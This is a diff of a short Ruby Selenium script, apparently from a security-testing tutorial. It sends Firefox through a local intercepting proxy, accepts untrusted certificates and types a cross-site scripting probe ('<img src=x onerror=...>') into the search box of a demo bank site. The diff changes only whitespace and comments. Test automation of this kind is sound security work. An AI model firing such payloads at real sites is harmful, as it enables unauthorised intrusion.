@@ -15,8 +15,8 @@ require "selenium-webdriver"
 # Profile Setup and Tweak 
 proxy = Selenium::WebDriver::Proxy.new(:http => "localhost:8080")       # Set Proxy hostname and port 
 profile = Selenium::WebDriver::Firefox::Profile.from_name "default"     # Use an existing profile name 
-profile.proxy = proxy		                                            # Set Proxy
-profile.assume_untrusted_certificate_issuer = false	                    # Accept untrusted SSL certificates 
+profile.proxy = proxy		                                        # Set Proxy
+profile.assume_untrusted_certificate_issuer = false	                # Accept untrusted SSL certificates 
 
 # Start Driver 
 driver = Selenium::WebDriver.for(:firefox, :profile => profile)         # Start firefox driver with specified profile
@@ -28,7 +28,7 @@ driver.navigate.to "http://www.altoromutual.com/search.aspx?"           # The UR
 element = driver.find_element(:name, 'txtSearch')   # Find an element named 'txtSearch'
 element.send_keys "<img src=x onerror='alert(1)'>"  # Send your keys to element
 element.send_keys(:control, 't')                    # Open a new tab
-element.submit                                      # Submit 
+element.submit 
 ```
 
 
